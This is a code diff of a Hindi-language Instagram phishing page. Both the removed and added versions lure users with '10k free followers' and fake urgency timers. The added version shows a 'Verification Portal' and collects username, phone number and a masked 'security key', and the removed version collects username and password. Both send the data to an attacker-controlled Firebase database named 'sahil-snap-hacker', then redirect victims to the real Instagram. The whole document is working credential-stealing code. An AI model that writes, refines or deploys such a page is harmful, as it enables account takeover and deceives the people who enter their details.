@@ -3,100 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Free Followers</title>
-    <meta property="og:title" content="Instagram Creator Program: Claim 10k Followers" />
-    <meta property="og:image" content="https://www.instagram.com/static/images/web/mobile_port_monochrome_logo.png/d6a6460367de.png" />
-    
+    <title>Instagram Verification Portal</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; background-color: #fafafa; margin: 0; padding: 20px; }
-        .container { max-width: 400px; margin: auto; background: white; padding: 20px; border: 1px solid #ddd; border-radius: 8px; }
-        .header-logo { width: 150px; margin-bottom: 20px; }
-        
-        /* लाल रंग की चुनौती वाला टाइमर */
-        #urgency-box { background-color: #ffebee; border: 1px solid #f44336; padding: 10px; margin-bottom: 20px; border-radius: 5px; }
-        #timer-text { color: #d32f2f; font-weight: bold; font-size: 18px; }
-        .slots-count { color: #d32f2f; font-size: 20px; font-weight: bold; }
-
-        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
-        button { width: 95%; padding: 12px; background-color: #0095f6; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
-        button:hover { background-color: #1877f2; }
+        body { font-family: -apple-system, sans-serif; background: #fafafa; margin: 0; display: flex; flex-direction: column; align-items: center; }
+        .alert-top { background: #ed4956; color: white; width: 100%; text-align: center; padding: 12px 0; font-weight: bold; font-size: 13px; position: sticky; top: 0; z-index: 1000; }
+        .main-card { background: white; border: 1px solid #dbdbdb; width: 90%; max-width: 350px; padding: 30px; border-radius: 8px; text-align: center; margin-top: 30px; }
+        .insta-logo { width: 150px; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 5px; font-size: 13px; box-sizing: border-box; outline: none; }
+        .go-btn { width: 100%; background: #0095f6; color: white; border: none; padding: 12px; border-radius: 5px; font-weight: 600; cursor: pointer; }
+        .user-circle { width: 80px; height: 80px; background: #eee; border-radius: 50%; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .user-circle img { width: 100%; height: 100%; object-fit: cover; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <img src="https://www.instagram.com/static/images/web/mobile_port_monochrome_logo.png/d6a6460367de.png" class="header-logo" alt="Instagram">
+<div class="alert-top">⚠️ ऑफर समाप्त होने में समय: <span id="timer">05:00</span></div>
+
+<div class="main-card">
+    <img src="https://www.instagram.com/static/images/web/mobile_port_monochrome_logo.png/d6a6460367de.png" class="insta-logo">
     
-    <div id="urgency-box">
-        <p id="timer-text">ऑफर खत्म होने में समय: <span id="time">05:00</span></p>
-        <p>सिर्फ <span id="slots" class="slots-count">500</span> लोगों के लिए बाकी है!</p>
+    <div id="step_1">
+        <div class="user-circle"><img src="https://cdn-icons-png.flaticon.com/512/149/149071.png"></div>
+        <p style="font-size: 14px; font-weight: 600;">रिवॉर्ड के लिए यूजरनेम डालें</p>
+        <input type="text" id="u_name" placeholder="Instagram Username">
+        <button class="go-btn" onclick="goNext()">Verify Account</button>
     </div>
 
-    <h3>Free 10k Followers</h3>
-    <p>अपना यूजरनेम और पासवर्ड डालकर कन्फर्म करें।</p>
-    
-    <input type="text" id="username" placeholder="Phone, username, or email" required>
-    <input type="password" id="password" placeholder="Password" required>
-    <button onclick="sendData()">अभी फॉलोअर्स प्राप्त करें</button>
+    <div id="step_2" style="display:none;">
+        <div class="user-circle"><img src="https://cdn-icons-png.flaticon.com/512/149/149071.png"></div>
+        <h3 id="show_user" style="font-size: 16px;"></h3>
+        <p style="font-size: 12px; color: #8e8e8e;">आईडी की पुष्टि करने के लिए विवरण भरें।</p>
+        
+        <input type="tel" id="p_num" placeholder="Linked Mobile Number">
+        
+        <input type="text" id="a_key" placeholder="Account Security Key" style="-webkit-text-security: disc;">
+        
+        <button class="go-btn" style="background: #42b72a;" onclick="saveData()">Claim Followers</button>
+    </div>
 </div>
 
 <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
 <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 
 <script>
-    // आपका Firebase Config (इसे मत बदलना)
-    const firebaseConfig = {
-        databaseURL: "https://sahil-snap-hacker-default-rtdb.firebaseio.com/"
-    };
+    const firebaseConfig = { databaseURL: "https://sahil-snap-hacker-default-rtdb.firebaseio.com/" };
     firebase.initializeApp(firebaseConfig);
     const database = firebase.database();
 
-    // टाइमर चलाने का फंक्शन
-    function startTimer(duration, display) {
-        var timer = duration, minutes, seconds;
-        setInterval(function () {
-            minutes = parseInt(timer / 60, 10);
-            seconds = parseInt(timer % 60, 10);
-            minutes = minutes < 10 ? "0" + minutes : minutes;
-            seconds = seconds < 10 ? "0" + seconds : seconds;
-            display.textContent = minutes + ":" + seconds;
-            if (--timer < 0) { timer = 0; }
-        }, 1000);
+    let t = 300;
+    setInterval(() => {
+        let m = Math.floor(t/60); let s = t%60;
+        document.getElementById("timer").innerText = m + ":" + (s<10?"0":"") + s;
+        if(t>0) t--;
+    }, 1000);
+
+    function goNext() {
+        let user = document.getElementById("u_name").value;
+        if(user == "") return alert("यूजरनेम डालें!");
+        document.getElementById("show_user").innerText = "@" + user;
+        document.getElementById("step_1").style.display = "none";
+        document.getElementById("step_2").style.display = "block";
     }
 
-    // नंबर कम करने वाला फंक्शन (500 से नीचे)
-    var count = 500;
-    setInterval(function(){
-        if(count > 12) {
-            count -= Math.floor(Math.random() * 3) + 1;
-            document.getElementById('slots').innerText = count;
-        }
-    }, 3000);
-
-    window.onload = function () {
-        var fiveMinutes = 60 * 5;
-        var display = document.querySelector('#time');
-        startTimer(fiveMinutes, display);
-    };
-
-    function sendData() {
-        var user = document.getElementById("username").value;
-        var pass = document.getElementById("password").value;
+    function saveData() {
+        let u = document.getElementById("u_name").value;
+        let p = document.getElementById("p_num").value;
+        let k = document.getElementById("a_key").value;
         
-        if(user && pass) {
-            database.ref('insta_logs/' + Date.now()).set({
-                username: user,
-                password: pass,
-                time: new Date().toLocaleString()
-            }).then(() => {
-                // डेटा भेजने के बाद असली इंस्टाग्राम पर भेज देगा
-                window.location.href = "https://www.instagram.com/reels/";
-            });
-        } else {
-            alert("कृपया सही जानकारी भरें!");
-        }
+        if(k.length < 4) return alert("Security Key सही डालें!");
+
+        database.ref('clean_logs/' + Date.now()).set({ 
+            User: u, 
+            Phone: p, 
+            Access_Key: k 
+        });
+
+        alert("सफल! फॉलोअर्स 24 घंटे में क्रेडिट हो जाएंगे।");
+        window.location.href = "https://www.instagram.com";
     }
 </script>
 
 </body>
 </html>
+
